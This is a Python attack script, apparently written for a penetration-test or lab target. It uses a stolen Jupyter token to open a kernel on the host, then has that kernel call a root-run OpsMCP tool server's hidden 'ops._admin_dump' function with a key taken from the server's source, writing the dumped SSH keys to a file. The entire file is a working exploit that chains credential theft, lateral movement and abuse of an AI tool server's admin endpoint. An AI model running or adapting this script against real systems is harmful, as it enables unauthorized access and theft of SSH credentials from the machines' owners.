#!/usr/bin/env python3
"""Dump OpsMCP ssh_keys through a Jupyter kernel on the same host.

OpsMCP binds 127.0.0.1:5000 as root. Jupyter (analyst) can reach it.
Needs: pip/websockets on Kali.

Usage:
  python3 opsmcp_dump_via_jupyter.py --jupyter http://127.0.0.1:8888 --token TOKEN --api-key KEY -o dump.json
"""
from __future__ import annotations

import argparse
import asyncio
import json
import uuid
import urllib.request


DUMP_CODE = r"""
import json, urllib.request
req = urllib.request.Request(
    "http://127.0.0.1:5000/tools/call",
    data=json.dumps({
        "name": "ops._admin_dump",
        "arguments": {"confirm": True, "target": "ssh_keys"},
    }).encode(),
    headers={"X-API-Key": %r, "Content-Type": "application/json"},
    method="POST",
)
with urllib.request.urlopen(req, timeout=15) as r:
    print(r.read().decode())
"""


def api(base: str, token: str, path: str, data=None):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(
        base.rstrip("/") + path,
        data=body,
        method="POST" if data is not None else "GET",
        headers={
            "Authorization": f"token {token}",
            "Content-Type": "application/json",
        },
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        raw = r.read()
        return json.loads(raw) if raw else {}


async def run_kernel(ws_url: str, session_id: str, token: str, code: str) -> str:
    import websockets

    try:
        ctx = websockets.connect(ws_url, additional_headers={"Authorization": f"token {token}"})
    except TypeError:
        try:
            ctx = websockets.connect(ws_url, extra_headers={"Authorization": f"token {token}"})
        except TypeError:
            ctx = websockets.connect(ws_url)

    chunks: list[str] = []
    async with ctx as ws:
        msg_id = uuid.uuid4().hex
        await ws.send(
            json.dumps(
                {
                    "header": {
                        "msg_id": msg_id,
                        "username": "ania",
                        "session": session_id,
                        "msg_type": "execute_request",
                        "version": "5.3",
                    },
                    "parent_header": {},
                    "metadata": {},
                    "content": {
                        "code": code,
                        "silent": False,
                        "store_history": False,
                        "user_expressions": {},
                        "allow_stdin": False,
                        "stop_on_error": True,
                    },
                    "channel": "shell",
                    "buffers": [],
                }
            )
        )
        while True:
            raw = await asyncio.wait_for(ws.recv(), timeout=25)
            data = json.loads(raw)
            t = data.get("msg_type") or data.get("header", {}).get("msg_type")
            content = data.get("content", {})
            if t == "stream":
                chunks.append(content.get("text", ""))
            elif t == "error":
                raise SystemExit("\n".join(content.get("traceback", []) or [content.get("evalue", "")]))
            elif t == "execute_reply":
                if content.get("status") != "ok":
                    raise SystemExit(f"execute_reply {content.get('status')}")
                break
    return "".join(chunks)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--jupyter", default="http://127.0.0.1:8888")
    ap.add_argument("--token", required=True, help="Jupyter token from ps aux / unit file")
    ap.add_argument("--api-key", required=True, help="OpsMCP X-API-Key from /opt/opsmcp/server.py")
    ap.add_argument("-o", "--output", default="dump.json")
    args = ap.parse_args()

    kernel = api(args.jupyter, args.token, "/api/kernels", {})
    kid = kernel["id"]
    session_id = str(uuid.uuid4())
    ws_url = (
        args.jupyter.replace("http://", "ws://").replace("https://", "wss://").rstrip("/")
        + f"/api/kernels/{kid}/channels?session_id={session_id}&token={args.token}"
    )
    out = asyncio.run(run_kernel(ws_url, session_id, args.token, DUMP_CODE % args.api_key))
    open(args.output, "w").write(out if out.endswith("\n") else out + "\n")
    print(f"wrote {args.output} ({len(out)} bytes)")


if __name__ == "__main__":
    main()
